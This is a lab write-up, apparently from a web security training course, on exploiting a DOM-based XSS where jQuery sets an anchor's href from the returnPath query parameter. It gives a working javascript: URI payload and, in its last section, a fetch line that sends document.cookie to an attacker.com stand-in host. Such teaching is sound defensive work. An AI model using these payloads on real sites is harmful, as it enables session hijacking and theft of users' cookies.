## Lab 05: DOM XSS in jQuery anchor href Attribute Sink Using location.search Source
 
**Technique:** DOM Based XSS via javascript: URI
**Sink:** jQuery `.attr('href', ...)`
**Source:** `location.search`
**Status:** Solved
 
### Context
 
The submit feedback page has a "back" button. The URL of that back button is built dynamically from a query parameter called `returnPath`. jQuery reads this parameter and sets it as the `href` of the anchor tag.
 
Something like:
 
```javascript
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```
 
Whatever is in `returnPath` becomes the `href` of the link.
 
### How I Found It
 
I changed the `returnPath` parameter in the URL to a random string and inspected the back button in the browser. My random string appeared directly inside the `href` attribute. Confirmed injection point.
 
### The Payload
 
```
javascript:alert(document.cookie)
```
 
Full URL:
```
https://[lab-id].web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```
 
The `href` becomes:
 
```html
<a href="javascript:alert(document.cookie)">Back</a>
```
 
When I clicked the back link, the browser executed `javascript:alert(document.cookie)` instead of navigating. The alert showed my cookie. Lab solved.
 
### The javascript: Protocol
 
`javascript:` is a URL scheme that tells the browser to execute whatever follows it as JavaScript instead of navigating to a URL. It is legal in `href` attributes. Most places that sanitise XSS will strip `<script>` tags but forget about `javascript:` URIs inside anchor tags, which is exactly why this category of vulnerability exists.
 
This lab also demonstrates why `document.cookie` matters as a payload beyond just `alert(1)`. In a real attack the goal would not be to pop an alert. It would be to send the cookie to an attacker-controlled server, which would look like:
 
```javascript
javascript:fetch('https://attacker.com/?c='+document.cookie)
```
 
That is how session hijacking via XSS actually works.
 
---
